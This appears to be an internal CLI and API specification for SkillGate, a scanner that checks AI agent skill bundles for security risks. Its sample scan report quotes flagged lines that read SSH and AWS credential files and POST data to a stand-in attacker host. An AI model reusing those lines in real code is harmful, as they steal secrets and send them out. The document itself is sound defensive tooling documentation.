# SkillGate — CLI & API Specification

**Product:** SkillGate  
**Version:** 1.0.0  
**Status:** Implemented baseline + roadmap  
**Last Updated:** 2026-02-18  
**Classification:** Internal — Confidential  

---

## Table of Contents

1. [CLI Overview](#1-cli-overview)
2. [Commands Reference](#2-commands-reference)
3. [Flags & Options](#3-flags--options)
4. [Exit Codes](#4-exit-codes)
5. [Output Examples](#5-output-examples)
6. [Environment Variables](#6-environment-variables)
7. [Hosted API Specification (Phase 2)](#7-hosted-api-specification-phase-2)

---

## 1. CLI Overview

### 1.1 Installation

```bash
# PyPI
pip install skillgate

# Homebrew (macOS, future)
brew install skillgate

# Docker
docker run --rm -v $(pwd):/scan skillgate/skillgate scan /scan/skill
```

### 1.2 Command Structure

```
skillgate <command> [options] [arguments]

Commands:
  scan       Scan a skill bundle for security risks
  run        Run an agent CLI through runtime gateway enforcement
  verify     Verify a signed attestation report
  init       Initialize a policy configuration file
  rules      List available detection rules
  bom        AI-BOM import and validation commands
  dag        Runtime session artifact commands
  gateway    Native hook commands for agent integrations
  auth       Authentication commands
  hunt       Search historical scan reports
  retroscan  Replay historical scans with updated rules
  hooks      Manage git hooks
  keys       Manage signing keys
  version    Show version information
```

---

## 2. Commands Reference

### 2.1 `skillgate scan`

Scan a skill bundle and produce a risk assessment.

```
skillgate scan <path|url> [options]

Arguments:
  path|url    Path to local skill bundle directory or ClawHub URL

Options:
  --output, -o <format>    Output format: human (default), json, sarif
  --policy, -p <file>      Policy file path or preset name (default: none)
  --enforce                Enable enforcement mode (exit 1 on violation)
  --sign                   Generate signed attestation report (Pro+)
  --report-file <path>     Write report to file (default: stdout)
  --quiet, -q              Suppress all output except errors
  --verbose, -v            Enable verbose/debug output
  --no-color               Disable colored output
```

**Examples:**

```bash
# Basic scan with human-readable output
skillgate scan ./skills/my-skill

# Scan with JSON output
skillgate scan ./skills/my-skill --output json

# Scan with policy enforcement
skillgate scan ./skills/my-skill --enforce --policy production

# Scan with custom policy file
skillgate scan ./skills/my-skill --enforce --policy ./skillgate.yml

# Scan with signed report written to file
skillgate scan ./skills/my-skill --sign --report-file report.json

# Scan a ClawHub URL (Phase 2)
skillgate scan https://clawhub.io/skills/example-skill

# Quiet mode for CI (only exit code matters)
skillgate scan ./skills/my-skill --enforce --policy production -q
```

### 2.2 `skillgate verify`

Verify a signed attestation report.

```
skillgate verify <report-file> [options]

Arguments:
  report-file    Path to signed JSON report file

Options:
  --public-key, -k <hex>  Hex-encoded public key for verification (default: key in report)
```

**Examples:**

```bash
# Verify a signed report
skillgate verify report.json

# Verify with specific public key
skillgate verify report.json --public-key ./team-key.pub
```

**Output (pass):**
```
✅ Attestation verified.
  Signer: ed25519:MCowBQYDK2Vw...
  Signed at: 2026-02-15T10:30:01Z
  Bundle hash: sha256:a1b2c3...
  Risk score: 45 (Medium)
  Policy: production — PASSED
```

**Output (fail):**
```
❌ Attestation verification failed.
  Reason: Signature does not match report contents.
  The report may have been tampered with.
```

### 2.3 `skillgate init`

Initialize a policy configuration file.

```
skillgate init [options]

Options:
  --preset <name>    Use a preset: development, staging, production (default), strict
  --output <path>    Output path (default: ./skillgate.yml)
  --force            Overwrite existing file
```

**Examples:**

```bash
# Create default production policy
skillgate init

# Create strict policy
skillgate init --preset strict

# Create in custom location
skillgate init --output policies/ci-policy.yml
```

### 2.4 `skillgate rules`

List all available detection rules.

```
skillgate rules [options]

Options:
  --category <name>    Filter by category: shell, network, filesystem, eval, credential, injection, obfuscation
  --output, -o <format>  Output format: human (default), json
```

**Example output:**

```
Detection Rules (40 total)

Category: Shell Execution (7 rules)
  SG-SHELL-001  subprocess_call     [HIGH]     subprocess.run/Popen/call detection
  SG-SHELL-002  os_system           [HIGH]     os.system() detection
  SG-SHELL-003  os_popen            [HIGH]     os.popen() detection
  SG-SHELL-004  shell_true          [CRITICAL] shell=True parameter
  SG-SHELL-005  backtick_exec       [HIGH]     Backtick command execution (JS/Shell)
  SG-SHELL-006  child_process       [HIGH]     Node.js child_process
  SG-SHELL-007  shutil_operations   [MEDIUM]   Destructive shutil operations

Category: Network Access (6 rules)
  ...
```

### 2.5 `skillgate keys`

Manage Ed25519 signing keys.

```
skillgate keys <subcommand>

Subcommands:
  generate    Generate a new Ed25519 key pair
```

**Examples:**

```bash
# Generate new signing key pair
skillgate keys generate

# Generate in custom location and overwrite existing keys
skillgate keys generate --key-dir ~/.skillgate/keys --force
```

### 2.6 `skillgate run`

Run an external agent CLI through SkillGate runtime controls.

```bash
skillgate run [options] -- <agent-cli ...>
```

Examples:

```bash
skillgate run --env dev -- codex exec "review diff"
skillgate run --env strict --skill-id approved-safe-skill --skill-hash <sha256> --scan-attestation valid -- claude -p "check runtime risk"
```

### 2.7 `skillgate bom`

AI-BOM runtime control commands.

```bash
skillgate bom import <cyclonedx.json> [--output .skillgate/bom/approved.json]
skillgate bom validate --skill-id <id> --skill-hash <sha256> --scan-attestation <value> [--mode strict]
```

### 2.8 `skillgate dag`

Runtime session artifact inspection and verification.

```bash
skillgate dag show <artifact-path>
skillgate dag verify <artifact-path>
```

### 2.9 `skillgate gateway`

Native hook mode for non-CI agent integrations.

```bash
skillgate gateway check --command "<planned tool call>" [options]
skillgate gateway scan-output --output-text "<tool output>" [options]
```

---

## 3. Flags & Options

### 3.1 Global Flags

| Flag | Short | Description | Default |
|---|---|---|---|
| `--help` | `-h` | Show help for command | — |
| `--version` | — | Show version | — |
| `--no-color` | — | Disable colored output | Colors enabled |
| `--verbose` | `-v` | Enable debug logging | Off |
| `--quiet` | `-q` | Suppress non-error output | Off |

### 3.2 Scan Flags

| Flag | Short | Type | Description | Default | Tier |
|---|---|---|---|---|---|
| `--output` | `-o` | `human\|json\|sarif` | Output format | `human` | Free |
| `--policy` | `-p` | `string` | Policy file or preset name | None | Pro |
| `--enforce` | — | `bool` | Enable enforcement mode | `false` | Pro |
| `--sign` | — | `bool` | Sign attestation report | `false` | Pro |
| `--report-file` | — | `path` | Write report to file | stdout | Free |

---

## 4. Exit Codes

| Code | Name | Meaning | When |
|---|---|---|---|
| `0` | `SUCCESS` | Scan completed successfully; policy passed (if enforced) | Normal completion |
| `1` | `POLICY_VIOLATION` | Scan completed; policy check failed | `--enforce` mode, violations found |
| `2` | `INTERNAL_ERROR` | Scanner encountered an internal error | Parse failure, I/O error, unexpected exception |
| `3` | `INVALID_INPUT` | Invalid arguments or configuration | Bad path, invalid policy file, missing required args |

### 4.1 CI Usage

```bash
# In CI scripts, check exit code
skillgate scan ./skill --enforce --policy production -q
if [ $? -eq 1 ]; then
  echo "Policy violation detected — blocking merge"
  exit 1
fi
```

---

## 5. Output Examples

### 5.1 Human-Readable Output

```
┌──────────────────────────────────────────────────────────────┐
│  SkillGate v1.0.0 — Skill Security Scan Report              │
├──────────────────────────────────────────────────────────────┤
│  Bundle: example-skill v0.1.0                                │
│  Files scanned: 12                                           │
│  Risk Score: 85 (HIGH)                                       │
│  Findings: 5                                                 │
├──────────────────────────────────────────────────────────────┤
│  Policy: production — ❌ FAILED                              │
│  Violations: 2                                               │
└──────────────────────────────────────────────────────────────┘

Findings:

  ⚠ SG-SHELL-001 [HIGH] subprocess_call
    handler.py:42 — Direct subprocess execution detected
    │ 42 │ result = subprocess.run(cmd, shell=True, capture_output=True)
    Remediation: Use subprocess.run() with argument list instead of shell=True.

  🔴 SG-CRED-003 [CRITICAL] ssh_key_read
    handler.py:58 — SSH private key file access detected
    │ 58 │ with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    Remediation: Remove direct access to SSH keys. Use a credential manager.

  ⚠ SG-NET-004 [HIGH] webhook_post
    handler.py:65 — Data exfiltration via HTTP POST detected
    │ 65 │ requests.post("https://evil.example.com/collect", json=data)
    Remediation: Remove or restrict outbound HTTP POST calls.

  ⚠ SG-CRED-004 [CRITICAL] aws_credentials
    handler.py:50 — AWS credential file access detected
    │ 50 │ with open(os.path.expanduser("~/.aws/credentials")) as f:
    Remediation: Use IAM roles or credential providers instead of direct file access.

  ⚠ SG-FS-003 [CRITICAL] sensitive_read
    handler.py:50 — Sensitive file access detected
    │ 50 │ with open(os.path.expanduser("~/.aws/credentials")) as f:
    Remediation: Restrict file reads to the skill's own directory.

Policy Violations:

  ✗ Risk score 85 exceeds maximum allowed score of 60
  ✗ Shell execution is not permitted under 'production' policy

Score Breakdown:
  Shell:       40 (47%)
  Credential:  30 (35%)
  Network:     15 (18%)
```

### 5.2 JSON Output

See Technical Spec Section 4 for full JSON schema.

### 5.3 SARIF Output

See Technical Spec Section 5 for full SARIF specification.

---

## 6. Environment Variables

| Variable | Description | Example |
|---|---|---|
| `SKILLGATE_API_KEY` | License/API key for Pro/Team features | `sg_live_abc123...` |
| `SKILLGATE_POLICY` | Default policy file or preset | `production` |
| `SKILLGATE_OUTPUT` | Default output format | `sarif` |
| `SKILLGATE_SIGNING_KEY` | Path to Ed25519 private key | `~/.skillgate/keys/signing_key.pem` |
| `SKILLGATE_LOG_LEVEL` | Log level | `DEBUG`, `INFO`, `WARN`, `ERROR` |
| `SKILLGATE_NO_COLOR` | Disable colored output (any value) | `1` |
| `CI` | Auto-detected CI environment | Auto-set by GitHub/GitLab |

---

## 7. Hosted API Specification (Phase 2)

### 7.1 Base URL

```
https://api.skillgate.io/v1
```

### 7.2 Authentication

All authenticated endpoints require an API key header:

```
Authorization: Bearer sg_live_abc123...
```

### 7.3 Endpoints

#### `POST /v1/verify`

Verify a signed attestation report. **Public endpoint — no auth required.**

**Request:**
```json
{
  "report": { ... },
  "attestation": { ... }
}
```

**Response (valid):**
```json
{
  "valid": true,
  "signer": "ed25519:MCowBQYDK2Vw...",
  "signed_at": "2026-02-15T10:30:01Z",
  "bundle_hash": "sha256:a1b2c3...",
  "risk_score": 45,
  "severity": "medium"
}
```

**Response (invalid):**
```json
{
  "valid": false,
  "reason": "Signature does not match report contents"
}
```

#### `POST /v1/scans`

Store a scan result. **Authenticated.**

**Request:**
```json
{
  "report": { ... }
}
```

**Response:**
```json
{
  "id": "scan_abc123",
  "created_at": "2026-02-15T10:30:00Z",
  "url": "https://app.skillgate.io/scans/scan_abc123"
}
```

#### `GET /v1/scans`

List scan history. **Authenticated.**

**Query parameters:**
- `page` (int, default 1)
- `per_page` (int, default 20, max 100)
- `bundle_name` (string, filter by bundle)
- `severity` (string, filter by severity)

**Response:**
```json
{
  "scans": [
    {
      "id": "scan_abc123",
      "bundle_name": "example-skill",
      "risk_score": 45,
      "severity": "medium",
      "policy_passed": true,
      "created_at": "2026-02-15T10:30:00Z"
    }
  ],
  "total": 42,
  "page": 1,
  "per_page": 20
}
```

#### `GET /v1/scans/{id}`

Get scan details. **Authenticated.**

**Response:**
Full scan report JSON (same as CLI JSON output).

#### `POST /v1/license/validate`

Validate a license key. **Called by CLI on first Pro feature use.**

**Request:**
```json
{
  "key": "sg_live_abc123...",
  "product": "skillgate",
  "version": "1.0.0"
}
```

**Response:**
```json
{
  "valid": true,
  "tier": "pro",
  "features": ["policy", "signing", "ci"],
  "expires_at": "2027-02-15T00:00:00Z"
}
```

#### `GET /v1/health`

Health check. **Public.**

**Response:**
```json
{
  "status": "ok",
  "version": "1.0.0"
}
```

### 7.4 Error Responses

All errors follow a consistent format:

```json
{
  "error": {
    "code": "UNAUTHORIZED",
    "message": "Invalid or expired API key",
    "details": {}
  }
}
```

| HTTP Status | Error Code | When |
|---|---|---|
| 400 | `BAD_REQUEST` | Invalid request body |
| 401 | `UNAUTHORIZED` | Missing or invalid API key |
| 403 | `FORBIDDEN` | Insufficient tier for action |
| 404 | `NOT_FOUND` | Resource not found |
| 422 | `VALIDATION_ERROR` | Schema validation failure |
| 429 | `RATE_LIMITED` | Too many requests |
| 500 | `INTERNAL_ERROR` | Server error |

### 7.5 Rate Limits

| Tier | Rate Limit |
|---|---|
| Free | 10 requests/minute |
| Pro | 60 requests/minute |
| Team | 300 requests/minute |
| Enterprise | 1000 requests/minute |

---

*End of CLI & API Specification — Version 1.0.0*
